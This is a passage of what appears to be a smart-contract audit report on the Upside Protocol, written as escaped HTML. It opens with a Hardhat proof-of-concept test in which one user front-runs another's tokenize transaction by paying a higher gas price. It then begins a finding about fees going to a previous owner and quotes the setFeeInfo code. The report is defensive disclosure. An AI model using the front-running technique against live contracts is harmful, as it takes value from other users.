class=\"mtk1\"\u003e = {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenizeFeeEnabled:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenizeFeeDestinationAddress:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenizeFeeDestinationAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeStartingBp:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e9900\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 99%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDecayBp:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,      \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 1%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDecayInterval:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e6\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 6 seconds\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeFinalBp:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,      \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 1%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDeployerBp:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 10%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeSellBp:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,       \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 1%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    };\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Set fee info\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eupsideProtocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Turn off auto-mining to simulate pending transactions in the mempool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enetwork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprovider\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;evm_setAutomine\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, [\u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// User1 submits a transaction with normal gas fees\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1Tx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eupsideProtocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etokenize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurl1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidityTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egasPrice:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;gwei\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Low priority\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// User2 submits the same transcation with higher gas price to front-run\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2Tx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eupsideProtocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etokenize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurl1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidityTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egasPrice:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;100\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;gwei\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// High priority\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Mine the transactions, user2\u0026#39;s should be prioritized\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enetwork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprovider\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;evm_mine\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Reactivate auto-mining for normal operation\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enetwork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprovider\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;evm_setAutomine\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, [\u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Verify that user1\u0026#39;s transaction failed because the URL was already tokenized\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1Tx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003erevertedWithCustomError\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eupsideProtocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;MetaCoinExists\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  }).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etimeout\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"02-transferring-ownership-may-result-in-fees-being-unintentionally-paid-to-the-previous-owner\" style=\"position:relative;\"\u003e\u003ca href=\"#02-transferring-ownership-may-result-in-fees-being-unintentionally-paid-to-the-previous-owner\" aria-label=\"02 transferring ownership may result in fees being unintentionally paid to the previous owner permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[02] Transferring ownership may result in fees being unintentionally paid to the previous owner\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L337-L353\"\u003ehttps://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L337-L353\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact\" aria-label=\"finding description and impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eIn the protocol, the \u003ccode\u003etokenizeFeeDestinationAddress\u003c/code\u003e is a configurable parameter that determines where tokenization fees are sent when the fee system is enabled. This address is set by the \u003ccode\u003eowner\u003c/code\u003e of the contract using a function \u003ccode\u003esetFeeInfo\u003c/code\u003e.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ( \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDeployerBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ||\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDecayBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ||\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeFinalBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeStartingBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ||\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeSellBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ||\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e\u0026gt;\u0026gt;          \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenizeFeeDestinationAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) ||\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeStartingBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeFinalBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDecayInterval\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eInvalidSetting\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eFeeInfoSet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan 